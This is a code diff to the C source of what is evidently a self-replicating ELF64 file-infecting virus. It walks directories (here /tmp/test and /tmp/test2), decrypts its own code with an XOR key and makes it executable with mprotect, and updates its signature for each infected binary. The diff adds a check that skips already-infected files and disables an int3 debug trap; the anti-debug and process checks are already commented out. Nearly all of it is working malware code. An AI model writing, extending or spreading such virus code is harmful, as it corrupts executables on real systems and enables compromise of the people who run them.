@@ -45,7 +45,7 @@ int   entry_point(void *magic) {
   char    infectDir2[] = "/tmp/test2";
   char    procName[] = "/proc/";
 
-  asm("int3");
+  /* asm("int3"); */
   /* if (checkProcess(procName) != 0) */
   /*   return (stop(1, magic)); */
   /* if (preventDebug() == -1) */
@@ -121,6 +121,7 @@ static int unObfuscate(void) {
     code[i] ^= 0xa5;
     i += 1;
   }
+  // TODO Update signature for each infected bin
   updateSignature();
   if (mprotect(aligned, size + ((void *)encryptStart - aligned), PROT_EXEC | PROT_READ) < 0)
     return (-1);
@@ -311,6 +312,18 @@ static size_t strlen(const char *s) {
   while (s[i])
     i += 1;
   return (i);
+}
+
+static int strncmp(const char *s1, const char *s2, size_t n) {
+  size_t  i;
+
+  i = 0;
+  while (s1[i] && s2[i] && i < n) {
+    if (s1[i] != s2[i])
+      return (s1[i] - s2[i]);
+    i += 1;
+  }
+  return (i < n ? s1[i] - s2[i] : 0);
 }
 
 static int strcmp(const char *s1, const char *s2) {
@@ -581,7 +594,7 @@ static void obfuscate(char *header, size_t size) {
 
 #define MAX_INS_SIZE 12
 
-char  instructions[][MAX_INS_SIZE] __attribute__ ((section (".text"))) = {
+const char  instructions[][MAX_INS_SIZE] __attribute__ ((section (".text#"))) = {
   "\xcc",
   "\x90",
   "",
@@ -731,6 +744,14 @@ static int  isCompatible(unsigned char e_ident[EI_NIDENT], Elf64_Half e_machine)
           e_machine == EM_X86_64);
 }
 
+static int  isInfected(struct bfile bin) {
+  Elf64_Shdr  *data;
+  char payload[] = PAYLOAD;
+
+  data = getDataSectionHeader(bin.header);
+  return ((strncmp((char *)(((void *)bin.header) + data->sh_offset + data->sh_size - (strlen(payload) + 1 + sizeof(size_t))), payload, strlen(payload))) == 0);
+}
+
 static int  infectBins(const char *dirname) {
   int                   fd;
   int                   ret;
@@ -751,7 +772,8 @@ static int  infectBins(const char *dirname) {
       return (-1);
     if (ret == 0 &&
       bin.size >= sizeof(Elf64_Ehdr) &&
-      isCompatible(bin.header->e_ident, bin.header->e_machine))
+      isCompatible(bin.header->e_ident, bin.header->e_machine) &&
+      !isInfected(bin))
       if (infectFile(bin) == -1)
         return (-1);
     bpos += dirp->d_reclen;
